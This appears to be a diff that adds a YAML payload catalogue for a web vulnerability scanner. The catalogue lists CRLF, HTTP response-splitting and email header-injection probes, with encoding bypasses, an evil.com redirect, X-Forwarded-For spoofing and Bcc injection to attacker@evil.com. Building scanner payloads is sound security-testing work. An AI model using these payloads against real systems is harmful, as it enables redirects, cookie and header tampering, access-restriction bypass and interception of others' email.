@@ -1,0 +1,175 @@
+defaults:
+  vuln_type: header_injection
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # CRLF injection — HTTP response splitting
+  # ============================================================
+  - technique: crlf_injection
+    injection_surface: query
+    evidence_type: header_match
+    risk: 3
+    payload: "%0d%0aX-Injected: true"
+    notes: "CRLF injection via URL-encoded CR+LF. Check if X-Injected appears in response headers."
+    tags: [crlf, response_splitting, header]
+
+  - technique: crlf_injection
+    injection_surface: query
+    evidence_type: header_match
+    risk: 3
+    payload: "%0aX-Injected: true"
+    notes: "LF-only header injection. Some servers accept bare LF as header delimiter."
+    tags: [crlf, lf_only, header]
+
+  - technique: crlf_injection
+    injection_surface: query
+    evidence_type: header_match
+    risk: 3
+    payload: "%0d%0aSet-Cookie: injected=1"
+    notes: "CRLF injection to set arbitrary cookie."
+    tags: [crlf, set_cookie, header]
+
+  - technique: crlf_injection
+    injection_surface: query
+    evidence_type: header_match
+    risk: 3
+    payload: "%0d%0aLocation: https://evil.com"
+    notes: "CRLF injection to inject Location header for redirect."
+    tags: [crlf, location, redirect]
+
+  - technique: response_splitting
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    payload: "%0d%0a%0d%0a<script>alert(1)</script>"
+    notes: "HTTP response splitting — double CRLF terminates headers, injects HTML body."
+    tags: [crlf, response_splitting, xss]
+
+  - technique: response_splitting
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    payload: "%0d%0a%0d%0a{\"injected\":true}"
+    notes: "HTTP response splitting — inject JSON body after double CRLF."
+    tags: [crlf, response_splitting, json]
+
+  # ============================================================
+  # CRLF via different injection surfaces
+  # ============================================================
+  - technique: crlf_injection
+    injection_surface: header
+    evidence_type: header_match
+    risk: 3
+    payload: "value%0d%0aX-Injected: true"
+    notes: "CRLF injection via HTTP request header value."
+    tags: [crlf, header_value, injection]
+
+  - technique: crlf_injection
+    injection_surface: path
+    evidence_type: header_match
+    risk: 3
+    payload: "/%0d%0aX-Injected:%20true"
+    notes: "CRLF injection via URL path segment."
+    tags: [crlf, path, injection]
+
+  - technique: crlf_injection
+    injection_surface: cookie
+    evidence_type: header_match
+    risk: 3
+    payload: "value%0d%0aX-Injected: true"
+    notes: "CRLF injection via cookie value."
+    tags: [crlf, cookie, injection]
+
+  # ============================================================
+  # Unicode and encoding bypasses
+  # ============================================================
+  - technique: crlf_injection
+    injection_surface: query
+    encoding: unicode
+    evidence_type: header_match
+    risk: 3
+    payload: "%E5%98%8A%E5%98%8DX-Injected: true"
+    notes: "Unicode CRLF bypass — UTF-8 encoded CR+LF (U+560A, U+560D). Bypasses ASCII-only CRLF filters."
+    tags: [crlf, unicode, bypass]
+
+  - technique: crlf_injection
+    injection_surface: query
+    encoding: double_url
+    evidence_type: header_match
+    risk: 3
+    payload: "%250d%250aX-Injected: true"
+    notes: "Double URL-encoded CRLF. Bypasses single-decode filters."
+    tags: [crlf, double_url, bypass]
+
+  - technique: crlf_injection
+    injection_surface: query
+    encoding: url
+    evidence_type: header_match
+    risk: 3
+    payload: "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>injected</html>"
+    notes: "Full HTTP response injection via CRLF. Attempt to create second response."
+    tags: [crlf, response_injection, full]
+
+  # ============================================================
+  # Email header injection
+  # ============================================================
+  - technique: email_header_injection
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "victim@example.com%0d%0aBcc: attacker@evil.com"
+    notes: "Email header injection — inject BCC header to receive copy of email."
+    tags: [email, bcc, injection]
+
+  - technique: email_header_injection
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "victim@example.com%0d%0aSubject: Phishing%0d%0a%0d%0aMalicious body"
+    notes: "Email header injection — override subject and inject body content."
+    tags: [email, subject, body_injection]
+
+  - technique: email_header_injection
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "victim@example.com\r\nBcc: attacker@evil.com"
+    notes: "Email header injection with raw CRLF characters."
+    tags: [email, bcc, raw_crlf]
+
+  - technique: email_header_injection
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "victim@example.com%0aBcc: attacker@evil.com"
+    notes: "Email header injection with LF-only line ending."
+    tags: [email, bcc, lf_only]
+
+  - technique: email_header_injection
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "victim@example.com\\r\\nBcc: attacker@evil.com"
+    notes: "Email header injection via JSON body (escaped CRLF)."
+    tags: [email, bcc, json]
+
+  # ============================================================
+  # Header injection via content-type
+  # ============================================================
+  - technique: crlf_injection
+    injection_surface: header
+    evidence_type: header_match
+    risk: 3
+    payload: "application/json%0d%0aX-Injected: true"
+    notes: "CRLF injection via Content-Type header value."
+    tags: [crlf, content_type, injection]
+
+  - technique: crlf_injection
+    injection_surface: query
+    evidence_type: header_match
+    risk: 3
+    payload: "test%0d%0aX-Forwarded-For:%20127.0.0.1"
+    notes: "CRLF injection to spoof X-Forwarded-For header. May bypass IP-based restrictions."
+    tags: [crlf, xff, ip_spoof]
